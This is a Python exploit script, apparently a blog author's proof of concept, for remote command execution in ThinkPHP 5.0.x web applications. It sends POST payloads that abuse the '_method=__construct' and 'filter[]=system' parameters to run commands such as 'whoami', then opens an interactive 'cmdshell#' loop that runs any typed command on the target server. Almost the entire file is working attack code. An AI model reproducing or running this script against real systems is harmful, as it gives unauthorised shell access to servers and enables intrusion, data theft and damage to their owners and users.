"""
author:jeffery.yu
blog: https://www.yu2lulu.xyz
descibe: thinkphp5.x远程命令执行
    受影响版本：ThinkPHP 5.0.x
    不受影响版本：ThinkPHP 5.0.24
"""

import requests
import re

header = {
    "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)"
}

def Exp(expolit):

    rep = requests.post(url=expolit['url'], headers=header, data=expolit['exp'])
    if rep.status_code==200:
        return "执行失败!"
    else:
        content=rep.text.replace("\n","")
        s = re.findall('<div class="echo">(.*?)</div>',content)[0].strip()
        if len(s) == 0:
            return "command not found"
        else:
            return s

def Poc(host,exp):
    exploit={}
    for uri,exp in exp.items():
        url=host+uri
        data={}
        for i in exp.split("&"):
            k,v=i.split("=")
            data[k]=v
        try:
            rep=requests.post(url=url,headers=header,data=data,timeout=2)
        except Exception as e:
            print("[-]网络不可达!")
            exit()
        else:
            content = rep.text.replace("\n", "")

            try:
                s = re.findall(r'<div class="echo">(.*?)</div>',content)[0].strip()
                if len(s)==0:
                    continue
                else:
                    exploit['url']=url
                    exploit['exp']=data
                    break
            except Exception as e:
                pass

    if len(exploit)==0:
        print("[-]%s 不存在该漏洞" %host)
    else:
        print("[+]%s 存在该漏洞" %host)
        while True:
            command=input("cmdshell#")
            if command=="":
                continue
            if exploit['exp'].get('server[REQUEST_METHOD]'):
                exploit['exp']['server[REQUEST_METHOD]']=command
            else:
                exploit['exp']['s'] = command
            print(Exp(exploit))





if __name__=="__main__":
    exp1="_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami"
    exp2="s=whoami&_method=__construct&method=&filter[]=system"
    exp={
        '/public/index.php?s=captcha':exp1,
        '/public/index.php?s=index/index/index':exp2
    }
    Poc("http://10.211.55.6:12306",exp)
